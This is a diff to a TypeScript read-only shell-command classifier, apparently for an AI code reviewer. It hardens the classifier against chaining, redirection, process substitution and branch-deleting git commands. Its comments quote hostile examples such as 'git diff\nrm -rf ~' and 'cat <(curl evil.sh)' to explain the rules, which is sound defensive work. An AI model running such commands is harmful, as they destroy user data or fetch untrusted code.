@@ -10,8 +10,9 @@
  * block. They all hang on this file now.
  *
  * Read-only is deliberately conservative: a fixed prefix list, and any
- * chaining or substitution syntax disqualifies the command outright instead
- * of being parsed. A read-only mode that can be talked around is not one.
+ * chaining, substitution or redirection syntax disqualifies the command
+ * outright instead of being parsed. A read-only mode that can be talked
+ * around is not one.
  */
 
 export type ShellCommandKind =
@@ -24,8 +25,36 @@ export type ShellCommandKind =
   | 'read'
   | 'generic'
 
-/** Chaining/substitution syntax: none of it is allowed in read-only mode. */
-const CHAINING = /[;&|`]|\$\(/
+/**
+ * Chaining/substitution/redirection syntax: none of it is allowed in
+ * read-only mode. Every character here can turn an inspection command into a
+ * write, so the command is disqualified outright rather than parsed.
+ *
+ *   ; & |     command separators, background, pipes (`&` also covers `&&`,
+ *             `&>file` and `>&file`)
+ *   ` and $(  command substitution
+ *   \n \r     a newline is a command separator too: "git diff\nrm -rf ~" was
+ *             read as read-only before this was here (audit CDX-2)
+ *   >         every output redirection (`>`, `>>`, `2>`, `&>`) and process
+ *             substitution `>(…)`
+ *   <(        process substitution: `cat <(curl evil.sh)` runs curl
+ *
+ * `<` on its own stays allowed: plain input redirection (`cmd < file`) only
+ * reads, and heredocs (`<<`, `<<<`) only feed stdin to a command from the
+ * prefix list — none of which writes what it reads. A real heredoc needs a
+ * newline for its body anyway, so it is already refused by `\n`.
+ *
+ * Conservative by design: a quoted `>` is refused as well (`git log
+ * --author="A <a@x>"`), because deciding that would mean parsing quoting,
+ * and a read-only mode that can be talked around is not one.
+ */
+const CHAINING = /[;&|`\n\r>]|\$\(|<\(/
+
+/**
+ * `--output=<file>` on git diff/show/log writes a file with no shell syntax
+ * at all, so CHAINING never sees it (audit CDX-2). No read needs the flag.
+ */
+const WRITE_FLAG = /(^|\s)--output(=|\s|$)/
 
 /** Prefixes a reviewer may run. Kept short on purpose (plan E4 point 1). */
 const READ_ONLY_PREFIXES = [
@@ -34,11 +63,45 @@ const READ_ONLY_PREFIXES = [
   'git diff',
   'git show',
   'git blame',
-  'git branch',
   'ls',
-  'cat ',
+  'cat',
   'pwd',
 ]
+
+/**
+ * `git branch` is not a read: `git branch -D main` deletes a branch and
+ * `git branch foo` creates one, so it cannot live in READ_ONLY_PREFIXES,
+ * whose match is "prefix + anything" (audit CDX-2). Listing forms stay
+ * allowed via the flag allowlist below, so `git branch -a`, `-vv` and
+ * `--show-current` keep working for real reviews.
+ */
+const GIT_BRANCH_READ_FLAGS =
+  /^(-a|--all|-r|--remotes|-v|-vv|--verbose|-l|--list|--show-current|--color(=\S+)?|--no-color|--column|--no-column|--sort=\S+|--format=\S+|-i|--ignore-case|--abbrev(=\S+)?|--no-abbrev)$/
+
+/** Filters that take a commit-ish; git stays in list mode, nothing is created. */
+const GIT_BRANCH_READ_FILTERS = /^(--merged|--no-merged|--contains|--no-contains|--points-at)$/
+
+function isReadOnlyGitBranch(args: string[]): boolean {
+  // With `--list` git is in list mode and a bare word is a shell pattern to
+  // match, not a branch name to create. Only the long form: old git read `-l`
+  // as --create-reflog, where `git branch -l foo` does create foo.
+  const listMode = args.includes('--list')
+  for (let i = 0; i < args.length; i++) {
+    const a = args[i]
+    if (GIT_BRANCH_READ_FLAGS.test(a)) continue
+    if (GIT_BRANCH_READ_FILTERS.test(a)) {
+      // The token after the filter is its commit-ish, never a branch name to
+      // create; swallowing it keeps `git branch --merged main` a read.
+      const next = args[i + 1]
+      if (next !== undefined && !next.startsWith('-')) i++
+      continue
+    }
+    if (listMode && !a.startsWith('-')) continue
+    // A bare word here is a branch name: `git branch foo` CREATES it.
+    return false
+  }
+  return true
+}
 
 /** A test run keeps run_tests' 300 s budget instead of the shell's 600 s. */
 const TEST_RUN = /^(npm|pnpm|yarn|bun)( run)? test\b|^(npx|pnpm|yarn|bun x?) ?(vitest|jest|mocha|playwright test)\b|^(cargo|go) test\b|^pytest\b|^python3? -m pytest\b/
@@ -61,12 +124,11 @@ export function commandKind(command: string): ShellCommandKind {
  */
 export function isReadOnlyCommand(command: string): boolean {
   const c = command.trim()
-  if (!c || CHAINING.test(c)) return false
+  if (!c || CHAINING.test(c) || WRITE_FLAG.test(c)) return false
+  // `git branch` needs its arguments checked, the prefix alone is not a read.
+  if (/^git\s+branch\b/.test(c)) return isReadOnlyGitBranch(c.split(/\s+/).slice(2))
   // Word-boundary match: `ls -la` yes, `lsof` no.
-  return READ_ONLY_PREFIXES.some((p) => {
-    const pt = p.trim()
-    return c === pt || c.startsWith(`${pt} `)
-  })
+  return READ_ONLY_PREFIXES.some((p) => c === p || c.startsWith(`${p} `))
 }
 
 /**
